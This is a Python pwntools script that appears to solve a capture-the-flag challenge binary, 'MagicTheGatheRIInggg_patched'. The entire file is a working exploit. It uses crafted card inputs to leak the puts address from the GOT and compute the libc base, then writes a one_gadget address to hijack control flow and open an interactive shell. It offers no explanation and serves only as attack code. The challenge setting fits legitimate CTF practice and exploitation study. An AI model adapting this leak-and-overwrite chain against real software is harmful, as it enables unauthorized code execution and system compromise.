from pwn import *

context.encoding = "latin1"

io = process("./MagicTheGatheRIInggg_patched")
elf = ELF("./MagicTheGatheRIInggg_patched")
#libc = ELF("./libc.so.6")
libc = ELF("./MagicTheGatheRIIng-libc.so")


# https://github.com/david942j/one_gadget#to-python-lovers
def one_gadget(filename):
    return [
        int(i)
        for i in subprocess.check_output(["one_gadget", "--raw", filename])
        .decode()
        .split(" ")
    ]


io.clean()
io.sendline("2")
io.clean()
io.sendline(f"20 m AAAA 0 {elf.got.puts} 0")
io.sendline("")
io.clean()
io.sendline("4")
io.recvuntil("Drew ")
leak = io.recv(6)
leak = u64(leak.ljust(8, b"\0"))
info(f"Leaked puts address: {hex(leak)}")
libc_base = leak - libc.sym.puts
info(f"Calculated Libc Base: {hex(libc_base)}")
libc.address = libc_base
og = one_gadget(libc.path)[1] + libc_base
info(f"one gadget: {hex(og)}")
io.clean()
io.sendline("2")
io.clean()
io.sendline(f"45 m AAAA 43690 {og & 0xFFFFFFFF} {og >> 4 * 8}")
io.sendline("")
io.interactive()
